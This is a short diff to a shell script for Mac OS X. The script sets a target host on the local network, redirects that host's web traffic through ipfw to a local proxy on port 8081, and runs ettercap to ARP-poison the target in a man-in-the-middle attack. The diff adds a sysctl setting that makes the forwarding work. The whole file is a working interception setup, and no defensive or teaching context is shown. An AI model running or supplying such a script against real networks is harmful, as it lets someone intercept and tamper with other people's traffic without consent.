@@ -7,7 +7,13 @@
 target=192.168.0.101
 
 # MAC OS X. Replace with rules such as iptables if on Linux
+#
+# this setting is necessary (at least on Snow Leopard), otherwise
+# ipfw counts increase but no packets are actually forwarded
+sudo sysctl -w net.inet.ip.scopedroute=0
 sudo ipfw -q flush
 sudo ipfw add fwd 127.0.0.1,8081 tcp from $target to any 80 via en1
 
+# Make sure net.inet.ip.forwarding=0
+# But ettercap will take care of this automatically so no worries there
 sudo ettercap -Tq -i en1 -M arp:remote /$target/ //
